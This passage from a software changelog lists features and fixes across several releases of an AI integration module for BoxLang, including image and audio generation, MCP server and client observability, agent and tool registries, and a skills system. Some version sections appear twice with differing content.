- **Image Generation — `aiImage()`**: New BIF for generating images from text prompts using any provider that implements `IAiImageService`.
  - **`aiImage( prompt, params, options )`** BIF: Generate one or more images from a text description. Returns an `AiImageResponse` (with `hasImages()`, `getCount()`, `getFirstURL()`, `getFirstBase64()`, `getRevisedPrompt()`, `saveToFile()`, `saveAllToDirectory()`, `toDataURI()`, `getMimeType()`, `toStruct()`) or saves directly to a file via `options.outputFile`.
  - **`IAiImageService`** interface: New capability interface implemented by providers that support text-to-image generation (`generateImage()`).
  - **`AiImageRequest`** object: Carries prompt, n, size, quality, style, instructions, outputFormat, and outputFile. All fields fluent via BoxLang property conventions.
  - **`AiImageResponse`** object: Wraps one or more generated images, each as a struct with `url`, `data` (binary), `mimeType`, and `revisedPrompt`. Convenience methods for saving, encoding, and embedding as data URIs.
  - **Provider support**:
    - **OpenAI** — `gpt-image-1` (default) and DALL-E models via `/v1/images/generations`. Supports quality/style/size controls and format/compression parameters.
    - **Gemini** — Imagen 3 (`imagen-3.0-generate-008`) via the Gemini API predict endpoint. Returns binary image data directly; `size` maps to aspect ratio (1:1, 16:9, 9:16).
    - **Grok (xAI)** — `grok-2-image` via `https://api.x.ai/v1/images/generations` (OpenAI-compatible format).
    - **OpenRouter** — FLUX Schnell (default) and many other image models via `https://openrouter.ai/api/v1/images/generations` (OpenAI-compatible format).
  - **4 new interception points**: `beforeAIImageGeneration`, `afterAIImageGeneration`, `onAIImageRequest`, `onAIImageResponse`.
  - **`image` settings block** in module config: `defaultProvider`, `defaultApiKey`, `defaultModel`, `defaultSize`, `defaultQuality`, `defaultStyle`, `defaultInstructions`.
  - **`generateImage@bxai` agent tool**: New `ImageTools` class (`models/tools/image/ImageTools.bx`) auto-registered in the global tool registry at module startup. Generates an image from a text prompt, saves to a file (auto-generates a temp file when no `outputFile` is supplied), and returns the absolute path. Opt-in: `aiAgent( tools: [ "generateImage@bxai" ] )`.

- **MCP Server Observability & Analytics Improvements**
  - Multiple gaps in the MCP server's observability and analytics have been addressed.
  - **Thread-safety fix**: `byMethod`, `byTool`, `byUri`, `byName`, and `byCode` counters in `MCPServerStats` were plain struct mutations happening outside any lock, causing silent lost updates under concurrent load. All are now wrapped in dedicated named locks.
  - **Security failure tracking**: Basic auth rejections, API key rejections, and body-size violations now increment dedicated `AtomicInteger` counters (`security.authFailures`, `security.apiKeyFailures`, `security.bodySizeViolations`) visible in `getStats()` and `getSummary()`. `MCPServer` exposes a `recordSecurityFailure(type)` method for processor delegation.
  - **Paused-request stats**: Requests rejected due to `SERVER_PAUSED` are now recorded in stats (previously they were silently dropped from all counters).
  - **`onMCPError` for METHOD_NOT_FOUND**: The `default:` switch case was the only error path that never fired the `onMCPError` interception point. Fixed.
  - **Per-tool error tracking**: `handleToolCall()` now records a tool error via `recordToolError()` before rethrowing any exception. `MCPServerStats` gains `byTool[name].errors` and an `errors.byTool` roll-up counter.
  - **Active concurrent request counter**: `MCPServerStats` gains an `activeRequests` `AtomicInteger`; `handleRequest()` increments it on entry and decrements it in a `finally` block. Exposed in `getStats()` and `getSummary()`.
  - **Requests-per-minute rate**: `getSummary()` now includes `requestsPerMinute` calculated from uptime and total request count.
  - **X-Request-ID correlation**: `HTTPTransport` reads the `X-Request-ID` request header (or generates a UUID if absent); `StdioTransport` always generates one. The ID is echoed as `X-Request-ID` in the response headers and included in `onMCPRequest` and `onMCPResponse` event payloads.

- **Agent Registry**
  — New `AIAgentRegistry` singleton (access via `aiAgentRegistry()` BIF) modeled after `AIToolRegistry`. Allows users to explicitly register `AiAgent` instances for centralized discoverability, observability, and analytics.
  - `aiAgentRegistry().register( agent, module )` — register an `AiAgent` instance with optional module namespace. Key convention: `agentName` or `agentName@moduleName`.
  - `aiAgentRegistry().unregister( key )` / `unregisterByModule( module )` — remove agents from the registry.
  - `aiAgentRegistry().resolveAgents( array )` — lazily resolve a mixed array of string keys and `AiAgent` instances into `AiAgent[]`.
  - `aiAgentRegistry().listAgents()` — returns a struct of all registered agents mapped to `{ name, description, module }` for analytics dashboards and introspection.
  - `aiAgentRegistry().getAgentInfo( key )` — returns `{ name, description, module }` for a single registry key.
  - Two new interception points: `onAIAgentRegistryRegister`, `onAIAgentRegistryUnregister` — fired on every register/unregister operation for external observability hooks.
  - `aiAgent()` BIF gains two new parameters: `register: false` (opt-in flag) and `module: ""` — when `register: true` the agent is automatically placed in the registry at creation time. Defaults to `false` to prevent memory leaks from sub-agents and throwaway agents.

- **MCP Client Stats & Observability**
  - `MCPClient` now tracks internal usage and performance metrics via a new `MCPClientStats` instance (using atomic variables for thread safety).
  - `getStats()` — returns a fully serializable struct with call totals, per-operation-type breakdowns, response time avg/min/max, per-tool invocation stats (`count`, `totalTime`, `avgTime`), per-URI resource counts, per-name prompt counts, and error tracking.
  - `getSummary()` — lightweight summary with `totalCalls`, `successRate`, `avgResponseTime`, per-type totals, `totalErrors`, and `lastCallAt`.
  - `resetStats()` — resets all counters to zero (fluent).
  - Three new interception points fired from every HTTP call:
    - `onMCPClientRequest` — fires before the HTTP request with `{ client, baseURL, operation, name, requestBody }`.
    - `onMCPClientResponse` — fires on success with `{ client, baseURL, operation, name, response, executionTime, statusCode }`.
    - `onMCPClientError` — fires on HTTP errors (bad status / JSON-RPC error) and on network-level exceptions with `{ client, baseURL, operation, name, error, statusCode, executionTime }` (includes `exception` key when fired from a `catch` block).
  - Every operation type is tracked: `tool` (covers `listTools` + `send`), `resource` (covers `listResources` + `readResource`), `prompt` (covers `listPrompts` + `getPrompt`), `discovery` (`getCapabilities`).

- **MCP Server Pause/Resume**
  - `MCPServer` now supports pausing and resuming via `pause()` and `resume()` fluent methods. While paused, the server remains registered in the global registry but rejects all incoming JSON-RPC requests (except `ping`) with a `SERVER_PAUSED` error (code `-32005`). This lets an admin interface or AI service temporarily halt a server without destroying its configuration, tools, resources, or prompts. Resume restores normal request handling instantly.
  - `pause()` — pause the server; fires `onMCPServerPause` interception point.
  - `resume()` — resume the server; fires `onMCPServerResume` interception point.
  - `isPaused()` — returns `true` if currently paused.
  - `getSummary()` now includes a `paused` boolean field.
  - New `SERVER_PAUSED: -32005` error code added to `RPC_ERROR_CODES`.
  - Two new interception points registered: `onMCPServerPause`, `onMCPServerResume`.

### 🧠 Improvements

- BoxLang 1.13.0 testing.
- You can now get the binded system message from an agent via `agent.buildSystemMessage()` for debugging and inspection.
- An agent config now includes the `systemMessage` property
- **Type-aware tool schemas**: `ClosureTool.getArgumentsSchema()` now maps BoxLang parameter types to their correct JSON Schema types instead of hard-coding everything as `"string"`. `numeric`/`integer`/`float`/`double` → `"number"`, `boolean` → `"boolean"`, `array` → `"array"` (with `"items": {}`), `struct` → `"object"`. Untyped params default to `"string"`. This means the AI receives accurate type hints and sends native JSON types (booleans, numbers, arrays, objects) instead of string-encoded values.

### 🪲 Fixed

- `ClosureTool.doInvoke()`: MCP clients that send JSON fields as real objects/arrays (instead of pre-stringified JSON) caused a "Can't cast Struct to a string" error before the callable ran. The fix walks the callable's declared parameters and `jsonSerialize()`s any non-simple value whose declared type is `string`, keeping the schema contract intact while accepting both wire formats. Callables that declare `struct`, `array`, or `any` parameters are left untouched.

## [3.1.0] - 2026-04-16

### 🥊 New Features

- **Audio Support — Text-to-Speech, Transcription, and Translation**:
  - **`aiSpeak( text, params, options )`** BIF: Convert text to speech using any provider that supports TTS. Returns an `AiSpeechResponse` (with `hasAudio()`, `saveToFile()`, `getBase64()`, `getMimeType()`, `getSize()`) or saves directly to a file via `options.outputFile`.
  - **`aiTranscribe( audio, params, options )`** BIF: Transcribe audio (file path, URL, or binary) to text. Returns the transcript string by default or a full `AiTranscriptionResponse` when `options.returnFormat = "response"`.
  - **`aiTranslate( audio, params, options )`** BIF: Translate non-English audio to English text using supported providers.
  - **`IAiSpeechService`** interface: Implemented by providers that support TTS (`speak()`).
  - **`IAiTranscriptionService`** interface: Implemented by providers that support STT (`transcribe()` + `translate()`).
  - **Provider support**: OpenAI (TTS + STT), Mistral/Voxtral (TTS + STT), Groq/Whisper (STT + translation), xAI/Grok (TTS), Gemini (TTS + STT), ElevenLabs (TTS + STT — new dedicated audio provider).
  - **`ElevenLabsService`**: New provider supporting high-quality TTS via `eleven_multilingual_v2` and STT via `scribe_v1`. Use `aiService("elevenlabs", apiKey)`.
  - **6 new interception points**: `beforeAISpeech`, `afterAISpeech`, `beforeAITranscription`, `afterAITranscription`, `beforeAITranslation`, `afterAITranslation`.
  - **`audio` settings block** in module config: `defaultVoice`, `defaultOutputFormat`, `defaultSpeechModel`, `defaultTranscriptionModel`.

- **Audio Agent Tools — `speak@bxai`, `transcribe@bxai`, `translate@bxai`**: New `AudioTools` class (`models/tools/audio/AudioTools.bx`) auto-registered in the global tool registry at module startup. `speak@bxai` converts text to speech and returns the saved file path (auto-generates a temp file when no `outputFile` is supplied). `transcribe@bxai` transcribes a local file or URL to plain text. `translate@bxai` translates any-language audio to English text. Opt-in by name: `aiAgent( tools: [ "speak@bxai", "transcribe@bxai", "translate@bxai" ] )`.

- **FileSystem Agent Tools** — New `FileSystemTools` class (`models/tools/filesystem/FileSystemTools.bx`) with 19 `@AITool`-annotated methods covering the full filesystem lifecycle. **NOT auto-registered** — opt-in only via `aiToolRegistry().scanClass()` so agents never get filesystem access unless explicitly granted. Supports a path-guard constructor (`allowedPaths: [...]`) that canonicalizes and validates every path argument before execution, blocking directory-traversal attacks. Tool keys: `readFile@bxai`, `readMultipleFiles@bxai`, `writeFile@bxai`, `appendFile@bxai`, `editFile@bxai`, `fileMetadata@bxai`, `pathExists@bxai`, `deleteFile@bxai`, `moveFile@bxai`, `copyFile@bxai`, `searchFiles@bxai`, `listAllowedDirectories@bxai`, `listDirectory@bxai`, `directoryTree@bxai`, `createDirectory@bxai`, `deleteDirectory@bxai`, `zipFiles@bxai`, `unzipFile@bxai`, `checkZipFile@bxai`.

- **Async Runnables and Parallel Execution**:
  - **`runAsync()` on all runnables** (`IAiRunnable`, `AiBaseRunnable`): Every runnable now has a non-blocking `runAsync(input, params, options)` method that dispatches execution to the `io-tasks` virtual thread pool and returns a `BoxFuture`. Mirrors the existing `aiChatAsync`, `loadAsync()`, and `seedAsync()` patterns throughout the module.
  - **`AiRunnableParallel` class** (`models/runnables/AiRunnableParallel.bx`): New runnable that accepts a named struct of runnables, fans them out concurrently via `runAsync()`, and returns a `{ name: result }` struct once all futures complete. Mirrors LangChain's `RunnableParallel` — a structural parallel composition primitive that integrates cleanly into the existing pipeline system via `.to()`, `.run()`, and `.runAsync()`.
  - **`aiParallel()` BIF**: Creates an `AiRunnableParallel` from a named struct of runnables. `aiParallel({ summary: summaryAgent, analysis: analysisAgent }).run("document")` runs both concurrently and returns `{ summary: "...", analysis: "..." }`.

### 🪲 Fixed

- `chatStream()` across all providers never fires the onAITokenCount event, making streaming calls completely invisible to usage tracking, billing, and monitoring. The non-streaming chat() path fires it correctly.
- `AiModel.stream()`: inject agent and model middleware into `chatRequest`, matching the existing pattern in `run()`
- `DockerModelRunnerService`: capture arguments into local vars before `retryOnModelLoading` closure to prevent `ArgumentsScope` resolution failure
- `OpenAIService.chat()`: capture `chatRequest` before nested `.each()` closures for tool calling
- `OpenAIService.chatStream()`: scope callback and `chatRequest` for `sendStreamRequest` call and tool-calling `.each()` closure
- `CohereService.chat()`: capture `chatRequest` before `.map()` tool closure
- `ClaudeService`, `GeminiService`, `CohereService`, and `BedrockService` `chat()` methods called `sendChatRequest()` / `sendBedrockRequest()` directly, silently bypassing the entire `wrapLLMCall` middleware chain. `beforeLLMCall`, `wrapLLMCall`, and `afterLLMCall` hooks (including `FlightRecorderMiddleware`, retry wrappers, and any custom LLM wrappers) never fired for these providers.
- Standardized the data for the `onAITokenCount` event and add missing event on the following services: `BedrockService, ClaudeService, CohereService, GeminiService`
- MCPServer `scan()` and `scanClass()` where not working accordingly with all cases and permutations.
- Invalid location of directory for flight recorder tapes
- `aiAgent()` bif, `skills, availableSkills` can now be an array or a single skill, we will normalize it to an array internally. This allows for more flexible agent construction with a single skill without needing to wrap it in an array.
- `ModuleConfig.bx` listens now to `onRuntimeStart()` in order to setup skills and more, so caches and other things are properly loaded before the modules.
- Docker Service issues with interface upgrades from previous version.

## [3.0.0] - 2026-04-02

## [2.4.0] - 2026-02-20

## [2.3.0] - 2026-02-18

### Added

- **Pipeline `_input` System Variable**: Auto-inject previous stage output into message templates via `${_input}`. For struct outputs, individual fields are flattened as `${_input_fieldName}` for template access. Enables clean, composable multi-stage AI pipelines without manual transformation steps.
- `aiTransform()` needd to process instances of `AiTransformRunnable` and `BaseTransformer` classes, allowing for more flexible and reusable transformation logic.
- Stricter and more defensive code when doing tool calling, to prevent errors when tools are called with invalid arguments or when the tool execution fails.

### Fixed

- Tool calling with streaming was not working because the tools were being executed in a different context that didn't have access to the request. Now the request is properly passed to the tool execution context, allowing tools to be called and executed correctly during streaming.
- Agent stream() was not passing tools the correct request, now it does.
- scoping issue on Agent streaming
- fixed BaseMemory getRecent() where limit was not being used
- SummaryMemory was not trimming messages when the summary threshold  was exceeded, and it was recursing forever on summary. Now it properly trims messages until it gets under the threshold, then summarizes and adds the summary message back in.
- BaseTransformer was missing it's internal constructor
- Default for `config` on all `BaseTransformer` classes was missing.
- Fixed a bug where if the `aiTransform()` BIF was called with a non-string or closure, the `throw()` was invalid.

## [2.2.0] - 2026-02-16

### Added

- **AI Skills system** (`aiSkill()` BIF + `withSkills()` / `withAvailableSkills()` APIs on `AiModel` and `AiAgent`): Composable, reusable knowledge blocks — following the [Claude Agent Skills open standard](https://www.anthropic.com/news/agent-skills) — that can be injected into any model or agent system message at runtime.
  - **`aiSkill( path | name, description, content, recurse )`** — Creates or discovers `AiSkill` instances. Pass a file path to load a single `SKILL.md`, a directory path to auto-discover all skills recursively, or `name`/`description`/`content` for inline definitions with no files needed.
  - **`aiGlobalSkills()`** — Returns the globally shared pool of skills auto-injected into every new agent's `availableSkills` pool. Populated via `ModuleConfig.bx` → `settings.globalSkills`.
  - **Always-on skills** (`withSkills()` / `addSkill()`): Full skill content is injected into the system message on every call. Best for small, universally relevant guidance.
  - **Lazy skills** (`withAvailableSkills()` / `addAvailableSkill()`): Only a compact index (name + description) is included in the system message. The LLM calls the auto-registered `loadSkill( name )` tool to fetch full content on demand. Best for large or rarely needed skill libraries.
  - **`activateSkill( name )`** — Moves a skill from the lazy pool to always-on, promoting it for the rest of the session.
  - **`buildSkillsContent()`** — Renders the combined skills system-message block for inspection or custom injection.
  - **SKILL.md format**: Each skill lives in its own subdirectory under `.ai/skills/`. The file is Markdown with an optional YAML frontmatter block containing `description`. The body is the instruction content. If frontmatter is absent, the first paragraph of body text is used as the description.
  - **`AiModel` and `AiAgent` `getConfig()`** now include `activeSkillCount`, `availableSkillCount`, and `skills` (a struct with `activeSkills` and `availableSkills` name/description arrays) for full introspection.
  - **`aiAgent()` BIF** gains `skills: []` and `availableSkills: []` construction-time parameters. Global skills from `aiGlobalSkills()` are automatically prepended to every new agent's available pool.
  - **`aiModel()` BIF** gains a `skills: []` construction-time parameter.
- **MCP server seeding for agents and models**: Agents and models can now be seeded directly with one or more MCP servers. All tools exposed by those servers are automatically discovered via `listTools()` and registered as `MCPTool` instances — no manual Tool construction required.
  - New `MCPTool` class (`models/tools/MCPTool.bx`) implements `ITool` by proxying a single MCP server tool. It converts the MCP `inputSchema` to the OpenAI function-calling schema format and forwards invocations to the server via `MCPClient.send()`.
  - New `withMCPServer( server, config )` fluent method on `AiAgent` and `AiModel`. Accepts a URL string or a pre-configured `MCPClient` instance. Optional `config` struct supports `token`, `timeout`, `headers`, `user`, and `password`.
  - New `withMCPServers( servers )` fluent method on `AiAgent` and `AiModel` for seeding from multiple servers in one call. Each entry can be a URL string, a config struct `{ url, token, timeout, … }`, or a pre-configured `MCPClient`.
  - New `listMcpServers()` method on `AiAgent` and `AiModel` returns the list of currently connected MCP servers with their exposed tools for introspection and debugging.
  - `aiAgent()` and `aiModel()` BIFs gain an `array mcpServers = []` parameter so servers can be provided at construction time.
  - `AiAgent` now tracks connected MCP servers in a `mcpServers` property (`[{ url, toolNames }]`). This list is automatically injected into the system prompt so the LLM can correctly answer questions like _"what MCP servers are you connected to?"_ and _"which tools came from which server?"_
  - New `listTools()` method on `AiAgent` returns `[{ name, description }]` for all registered tools — useful for programmatic introspection.
  - `AiAgent|AiModel.getConfig()` now includes `tools` (full name/description list) and `mcpServers` (server URL + tool-name list) alongside the existing `toolCount`.
- **Global AI Tool Registry**: New singleton `AIToolRegistry` (accessible via `aiToolRegistry()` BIF) provides a module-scoped registry for AI tools. Tools can be registered by name with optional module namespacing (e.g. `now@bxai`), discovered at runtime by bare name or full key, and resolved lazily before LLM requests via `aiToolRegistry().resolveTools()`. This means tools can be referenced by string name in `params.tools` arrays and resolved automatically rather than requiring live object references.
- **`BaseTool` abstract base class**: All tool implementations now extend `BaseTool`, which provides the shared invocation lifecycle (firing `beforeAIToolExecute` and `afterAIToolExecute` interception events), result serialization (primitives pass through, complex values serialize to JSON), and the fluent `describeArg()` / `describe[ArgName]()` schema annotation syntax.
- **`ClosureTool` class**: Replaces the retired `Tool.bx`. A `BaseTool` subclass backed by any closure or lambda. Auto-introspects the callable's parameter metadata to generate an OpenAI-compatible function schema. Receives the originating `AiChatRequest` as `_chatRequest` for context-aware closures.
- **`CoreTools` built-in tools**: Ships two tools out of the box. `now` (registered automatically as `now@bxai` on module load) returns the current date/time in ISO 8601 — ideal for giving the AI temporal awareness. `httpGet` (opt-in only, **not** auto-registered for security) fetches any URL via HTTP GET. Register it explicitly if your application requires web access.
- **Lazy tool resolution**: `params.tools` arrays in `aiChat()`, `aiModel().run()`, and `aiAgent().run()` now accept string registry keys alongside live `ITool` instances. `AIToolRegistry::resolveTools()` converts any string keys to their registered `ITool` before the request is sent.
- Two new interception points: `onAIToolRegistryRegister` and `onAIToolRegistryUnregister`.
- Structured output for ollama tools, allowing for more complex and rich tool responses that can include multiple fields and nested data instead of just a single string output.
- Streaming tools for ollama, allowing tools to return data in a streaming fashion for real-time processing and response generation.
- Tools can now have non-required arguments in their schema
- Tools can now access the full `AiChatRequest` object during invocation, allowing for more complex and context-aware tool behavior. They receive a `_chatRequest` argument that includes all the properties of the original request, such as `messages`, `params`, `options`, and more. This enables tools to make informed decisions based on the full conversation context and request configuration.
- HuggingFace embeddings support
- Ability to send a custom URL to the different senders in the base service.
- Middleware support for `AiModel` and `AiAgent`, with agent middleware prepended ahead of model middleware.
- Provider lifecycle hooks in `preRequest()`, `postResponse()`,for any custom logic before and after requests to change the shape of the request or response, log additional data, etc.  These hooks are provider-specific and allow for custom behavior without needing to override the entire `sendChatRequest()` method.
- **Per-call identity routing on all memory types**: `add()`, `getAll()`, `clear()`, `trim()`, `seed()`, and related methods on every `IAiMemory` and `IVectorMemory` implementation now accept optional `userId` and `conversationId` arguments. This follows the Spring AI `ChatMemory` pattern — a single memory instance can safely serve multiple tenants without creating a new instance per user. Construction-time values remain as fallbacks.
- **Provider capability interfaces**: New `models/providers/capabilities/` package introduces `IAiChatService` and `IAiEmbeddingsService` — scoped interfaces that let providers declare exactly which operations they support at the type level rather than through runtime throws.
- **`getCapabilities()` / `hasCapability()` on all providers**: Every provider now exposes `getCapabilities()` (returns `["chat", "stream", "embeddings", ...]`) and `hasCapability( "chat" )` for clean, self-documenting runtime introspection. These are backed by `isInstanceOf()` checks and stay automatically in sync with the `implements` declarations on each provider — no maintenance required.
- **`AiAgent` parent-child hierarchy**: `AiAgent` now tracks its position in a multi-agent tree through a `parentAgent` property and a full set of hierarchy helpers:
  - `setParentAgent(parent)` — assign a parent with self-reference and cycle-detection guards
  - `clearParentAgent()` — detach from a parent
  - `hasParentAgent()` — returns `true` if the agent has a parent
  - `isRootAgent()` — returns `true` for top-level agents
  - `getRootAgent()` — walks up the tree and returns the root agent
  - `getAgentDepth()` — returns the nesting depth (0 = root, 1 = direct child, …)
  - `getAgentPath()` — returns a slash-delimited path string, e.g. `/coordinator/researcher`
  - `getAncestors()` — returns an ordered array `[immediateParent, …, root]`
  - `addSubAgent()` now automatically calls `setParentAgent(this)` on the sub-agent
  - `setSubAgents()` now calls `clearParentAgent()` on replaced sub-agents before replacing them
  - `getConfig()` now includes `parentAgent` (name string), `agentDepth`, and `agentPath`

### Changed

- Refactored all runnable objects to the `runnables` folder. This includes `AiModel`, `AiAgent`, and `AiMessage`. This better reflects their purpose as executable entities that can be run with different inputs, and allows for a cleaner separation between the core service logic and the runnable wrappers.
- Refactored the `BaseService` to be truly a base and move all OpenAI specific logic to `OpenAIService`, which now serves as the default provider implementation. This allows for cleaner implementations of other providers that don't need to override every method.
- **`AiAgent` is now fully stateless**: `userId`, and `conversationId` are resolved per-call from the `options` argument passed to `run()` and `stream()`, eliminating shared-state concurrency bugs in multi-user deployments.  Seeding a memory with `userId` and `conversationId` is still supported, but these values will be overridden by any values passed in at call time.
- `resume()` and `resumeStream()` now require `threadId` as an explicit `required string` argument instead of defaulting to the former instance property.
- **`IAiService` contract trimmed**: The base interface now declares only identity/configuration/capability-discovery methods (`getName()`, `configure()`, `getCapabilities()`, `hasCapability()`). The operation methods (`invoke()`, `invokeStream()`, `embeddings()`) have moved to their respective capability interfaces where they belong.
- **`VoyageService` now extends `BaseService` directly** and implements only `IAiEmbeddingsService` — it no longer extends `OpenAIService` with stubbed-out chat methods that threw at runtime. The type system now enforces the embeddings-only constraint at compile time.
- **`aiChat()`, `aiChatStream()`, and `aiEmbed()` BIF guards**: Each BIF now checks the provider implements the required capability interface before attempting the call and throws a clear `UnsupportedCapability` exception instead of a cryptic provider error. Zero breaking changes to public BIF signatures.

### Improvements

- Renamed `BaseService.sendRequest()` to `sendChatRequest()`.
- Reduced duplicate payload fields in `onAITokenCount`.

### Fixed

- Model and Agent streaming was not announcing global pre/post events
- Changelog corruption due to merge conflict.
- MCP requestId null scope crash on JSON-RPC notifications for MCP servers
- MiniMax chat errors (`base_resp.status_code != 0`) now surface correctly.
- **`OllamaService` stale `postEmbeddingResponse()` hook**: The old hook was never wired to the current `BaseService` lifecycle and silently did nothing. Replaced with the proper `postResponse( aiRequest, dataPacket, result, operation )` override that guards on `operation != "embeddings"`, identical to how every other dual-capability provider handles this.

## [2.4.0] - 2026-02-20

### Added

- **MiniMax AI Provider**: Added support for [MiniMax](https://platform.minimax.io/) AI service with chat, streaming, and embeddings support. Use the `minimax` provider name and set your API key via the `MINIMAX_API_KEY` environment variable.
- Updated `getConfig()` to not show sensitive info.

### Fixed

- BoxLang static constructs instead of inline to avoid issues with never versions.

## [2.3.0] - 2026-02-18

### Added

- **Pipeline `_input` System Variable**: Auto-inject previous stage output into message templates via `${_input}`. For struct outputs, individual fields are flattened as `${_input_fieldName}` for template access. Enables clean, composable multi-stage AI pipelines without manual transformation steps.
- `aiTransform()` needd to process instances of `AiTransformRunnable` and `BaseTransformer` classes, allowing for more flexible and reusable transformation logic.
- Stricter and more defensive code when doing tool calling, to prevent errors when tools are called with invalid arguments or when the tool execution fails.

### Fixed

- Tool calling with streaming was not working because the tools were being executed in a different context that didn't have access to the request. Now the request is properly passed to the tool execution context, allowing tools to be called and executed correctly during streaming.
- Agent stream() was not passing tools the correct request, now it does.
- scoping issue on Agent streaming
- fixed BaseMemory getRecent() where limit was not being used
- SummaryMemory was not trimming messages when the summary threshold  was exceeded, and it was recursing forever on summary. Now it properly trims messages until it gets under the threshold, then summarizes and adds the summary message back in.
- BaseTransformer was missing it's internal constructor
- Default for `config` on all `BaseTransformer` classes was missing.
- Fixed a bug where if the `aiTransform()` BIF was called with a non-string or closure, the `throw()` was invalid.

## [2.2.0] - 2026-02-16

### Added

- Consolidated AI request/response logging with execution time metrics for better performance insights.
- Improved AI request/response to include other metrics in order to provide better insights into performance and potential bottlenecks.

### Improved

- Consolidation of options and settings, to have a single source of truth for configuration and to allow for better overrides and defaults.
- Stream request logging to include execution time metrics for better performance monitoring and debugging insights.
- If the chunk is empty, skip it (keep-alive or heartbeat) when doing chat streams. This prevents unnecessary processing of empty chunks and potential errors when parsing.

### Fixed

- Invalid use of `request` in the `aiChatStream()` BIF, which should have been `chatRequest`.
- Extends for AiTransformRunnable was wrong.
- AiModel extractMessages() was not flattening the messages correctly when the response had multiple choices with multiple messages. Now it properly flattens all messages from all choices into a single array.
- Order of settings merging in `aiChat()` and `aiChatStream()` BIFs was incorrect, causing default options to override user-provided options. Now it merges in the correct order: user options → module settings → default options, allowing for proper overrides.
- Error invoking population in schema builder, the third argument needs to be an array or struct, not a single value.
- Fixed a bug where provider options in the configuration file were not being merged into the request options when creating a service instance.
- Fixed a bug where the `aiService()` BIF was not correctly applying convention-based API key detection when `options.apiKey` was already set but empty. Now it checks if `options.apiKey` is empty before applying the convention key, allowing for proper fallback to environment variables or module settings.

## [2.1.0] - 2026-02-04

What's New: <https://ai.ortusbooks.com/readme/release-history/2.1.0>

### Added

- New event: `onMissingAiProvider` to handle cases where a requested provider is not found.
- `aiModel()` BIF now accepts an additional `options` struct to seed services.
- New configuration: `providers` so you can predefine multiple providers in the module config, with default `params` and `options`.

```js
"providers" : {
	"openai" : {
		"params" : {
			"model" : "gpt-4"
		},
		"options" : {
			"apiKey" : "my-openai-api-key"
		}
	},
	"ollama" : {
		"params" : {
			"model" : "qwen3:0.6b"
		},
		"options" : {
			"baseUrl" : "http://my-ollama-server:11434/"
		}
	}
}
```

- OllamaService now supports custom base URLs for both chat and embeddings endpoints via the `options.baseUrl` parameter.
- `AiBaseRequest.mergeServiceParams()` and `AiBaseRequest.mergeServiceHeaders()` methods now accept an `override` boolean argument to control whether existing values should be overwritten when merging.
- Local Ollama docker setup instructions updated to include the `nomic-embed-text` model for embeddings support.
- Ollama Service now supports embedding generation using the `nomic-embed-text` model.
- **Multi-Tenant Usage Tracking**: Provider-agnostic request tagging for per-tenant billing
  - New `tenantId` option for attributing AI usage to specific tenants
  - New `usageMetadata` option for custom tracking data (cost center, project, userId, etc.)
  - Enhanced `onAITokenCount` events with tenant context for interceptor-based billing
  - Works with all providers: OpenAI, Bedrock, Ollama, DeepSeek, etc.
  - Fully backward compatible - existing code works unchanged
- **Provider-Specific Options Support**: Generic `providerOptions` struct for provider-specific settings
  - New `providerOptions` option for passing provider-specific configuration (e.g., `inferenceProfileArn` for Bedrock)
  - New `getProviderOption(key, defaultValue)` method on requests for retrieving provider options
  - Enables extensibility for any provider-specific features without polluting the common interface
- **OpenSearch Vector Memory Provider**: Full integration with OpenSearch k-NN for semantic search
  - Support for OpenSearch 2.x and 3.x with automatic version detection and space type mapping
  - HNSW index configuration options (M, ef_construction, ef_search parameters)
  - Space type options: cosinesimilarity, l2, innerproduct
  - Basic authentication support (username/password)
  - AWS region configuration for SigV4 authentication with AWS OpenSearch Service
  - Multi-tenant isolation with userId and conversationId filtering
  - Comprehensive test coverage for configuration, validation, and operations
- **OpenAI-Compatible Embedding Support**: Vector memory providers now support custom embedding endpoints
  - New `embeddingOptions` configuration in `BaseVectorMemory` for passing options to embedding provider
  - Use `embeddingOptions.baseURL` for custom OpenAI-compatible embedding service URLs
  - Allows using self-hosted or alternative OpenAI-compatible embedding services
  - Works with providers like Ollama, LM Studio, and other compatible APIs
- **AWS Bedrock Streaming Support**: Full streaming support for Bedrock provider
  - Streaming via `InvokeModelWithResponseStream` API endpoint
  - Support for all model families: Claude, Titan, Llama, Mistral
  - AWS event-stream format parsing with base64 payload decoding
  - OpenAI-compatible streaming response format for consistent callback handling
  - Added more AiError exception handling for service json errors.

### Changed

- All AI provider services now inherit default chat and embedding parameters from the `IAiService` interface, ensuring consistent behavior across providers.
- `IAiService.configure()` method now accepts a generic `options` argument instead of `apiKey`, to better reflect its purpose and support more configuration options.
- `AiRequest` class renamed to `AiChatRequest` for clarity, and multi-modality support.

### Fixed

- Events for chat requests were incorrectly named in the ModuleConfig.bx file. Corrected to `onAIChatRequest`, `onAIChatRequestCreate`, and `onAIChatResponse`.
- `aiChat, aiChatStream` BIF was not passing headers to the AiChatRequest.
- `aiChat, aiChatStream, aiChatAsync` BIF was not using `aiChatRequest()` to build the request, but was building it manually.
- According to the MCP spec prompts should return a key named "arguments" not "args".
- AiRequest was not setting the model correctly from params.
- API key was not being passed to the service in `aiChat(), aiChatStream()` BIF.
- Typo of `chr()` --> `char()` in SSE formatting in MCPRequestProcessor and HTTPTransport.
- `AiModel.getModel()` was not returning the model name correctly when using predefined providers from config.
- Increased Docker Model Runner retry time to 5 seconds with 10 max retries to accommodate large model loading times
- Fixed `url` parameter conflict in OpenSearchVectorMemory by using `requestUrl` for HTTP requests

## [2.0.0] - 2026-01-19

What's New: <https://ai.ortusbooks.com/readme/release-history/2.0.0>

One of our biggest library updates yet! This release introduces a powerful new document loading system, comprehensive security features for MCP servers, and full support for several major AI providers including Mistral, HuggingFace, Groq, OpenRouter, and Ollama. Additionally, we have implemented complete embeddings functionality and made numerous enhancements and fixes across the board.

### Added

- **Document Loaders**: New document loading system for importing content from various sources
  - New `aiDocuments()` BIF for loading documents with automatic type detection
  - New `aiDocumentLoader()` BIF for creating loader instances with advanced configuration
  - New `aiDocumentLoaders()` BIF for retrieving all registered loaders with metadata
  - New `aiMemoryIngest()` BIF for ingesting documents into memory with comprehensive reporting:
    - Single memory or multi-memory fan-out support
    - Async processing for parallel ingestion
    - Automatic chunking with `aiChunk()` integration
    - Token counting with `aiTokens()` integration
    - Cost estimation for embedding operations
    - Detailed ingestion report (documentsIn, chunksOut, stored, skipped, deduped, tokenCount, embeddingCalls, estimatedCost, errors, memorySummary, duration)
  - New `Document` class for standardized document representation with content and metadata
  - New `IDocumentLoader` interface and `BaseDocumentLoader` abstract class for custom loaders
  - **Built-in Loaders**:
    - `TextLoader`: Plain text files (.txt, .text)
